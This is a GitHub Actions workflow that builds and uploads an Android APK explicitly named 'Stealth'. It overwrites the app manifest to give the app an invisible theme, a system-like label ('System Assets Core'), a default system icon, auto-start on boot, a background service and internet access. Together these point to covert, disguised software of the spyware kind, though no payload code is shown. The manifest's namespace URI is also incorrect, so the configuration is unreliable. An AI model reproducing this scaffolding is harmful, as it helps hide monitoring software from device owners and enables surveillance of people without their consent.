name: Build Stealth Android APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository Code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Gradle Environment
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: Auto-Fix Android Configuration & Cleansing
        run: |
          # 1. مسح أي ملفات خصائص يدوية مكررة وضبط المسار الصحيح للـ SDK
          rm -f android/local.properties
          echo "sdk.dir=$ANDROID_HOME" > android/local.properties
          
          # 2. تطهير وإعادة بناء ملف AndroidManifest.xml برمجياً لضمان خلوه من أي أحرف تالفة
          mkdir -p android/app/src/main
          rm -f android/app/src/main/AndroidManifest.xml
          
          cat << 'EOF' > android/app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://android.com">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

              <application
                  android:allowBackup="false"
                  android:icon="@android:drawable/sym_def_app_icon"
                  android:label="System Assets Core"
                  android:theme="@android:style/Theme.NoDisplay">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".SyncService"
                      android:enabled="true"
                      android:exported="false" />

                  <receiver
                      android:name=".BootReceiver"
                      android:enabled="true"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

              </application>
          </manifest>
          EOF

      - name: Generate Fresh Gradle Wrapper
        run: |
          cd android
          gradle wrapper --gradle-version 8.5
          chmod +x gradlew

      - name: Build Android App Release (APK)
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon

      - name: Upload Output Artifact (APK)
        uses: actions/upload-artifact@v4
        with:
          name: Stealth-Core-Application
          path: android/app/build/outputs/apk/release/app-release.apk
